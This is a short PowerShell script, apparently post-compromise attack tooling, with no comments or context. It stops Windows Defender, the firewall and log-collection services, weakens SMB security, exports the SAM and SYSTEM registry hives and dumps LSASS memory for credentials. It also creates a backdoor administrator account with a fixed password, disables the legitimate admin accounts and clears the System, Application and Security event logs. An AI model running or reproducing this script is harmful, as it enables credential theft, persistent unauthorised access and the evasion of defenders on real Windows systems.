$id=(Get-Process -Name "lsass").id
$pwd=ConvertTo-SecureString -String "Temp@123" -AsPlainText -Force

Stop-Process -Name "MsMpEng" -Force -ErrorAction Ignore

Stop-Service -Name "mpssvc" -Force -ErrorAction Ignore
Stop-Service -Name "CiscoSCMS" -Force -ErrorAction Ignore
Stop-Service -Name "WinDefend" -Force -ErrorAction Ignore
Stop-Service -Name "SNMP" -Force -ErrorAction Ignore
Stop-Service -Name "W3SVC" -Force -ErrorAction Ignore
Set-SmbServerConfiguration -EnableSMB1Protocol $true -Force -ErrorAction Ignore
Set-SmbServerConfiguration -EnableSMB2Protocol $false -Force -ErrorAction Ignore
Set-SmbServerConfiguration -EnableSecuritySignature $false -RequireSecuritySignature $false -Force
Set-NetFirewallProfile -Profile Domain, Public, Private -Enabled False -ErrorAction Ignore
Set-MpPreference -DisableRealtimeMonitoring $true

Invoke-Command {reg export 'HKLM\SAM' C:\sam.reg}
Invoke-Command {reg export 'HKLM\SYSTEM' C:\system.reg}
Invoke-Command {rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump $id C:\lsass.dmp full}

New-LocalUser -Name "0xDEADDEAD" -FullName "0xDEADDEAD" -AccountNeverExpires -Description "C0MPR0M1ZED" -Password $pwd -PasswordNeverExpires -UserMayNotChangePassword
Add-LocalGroupMember -Group "Administrators" -Member "0xDEADDEAD"
Remove-LocalGroupMember -Group "Administrators" -Member "algo"
Disable-LocalUser -Name "algo"
Disable-LocalUser -Name "Administrator"

Stop-Process -Name "WinCollectSvc" -Force -ErrorAction Ignore
Stop-Process -Name "WinCollect" -Force -ErrorAction Ignore
Stop-Service -Name "WinCollect" -Force -ErrorAction Ignore
Set-Service -Name "WinCollect" -StartupType Disabled
Set-Service -Name "W3SVC" -StartupType Disabled
Set-Service -Name "SNMP" -StartupType Disabled

Clear-EventLog -LogName System
Clear-EventLog -LogName Application
Clear-EventLog -LogName Security
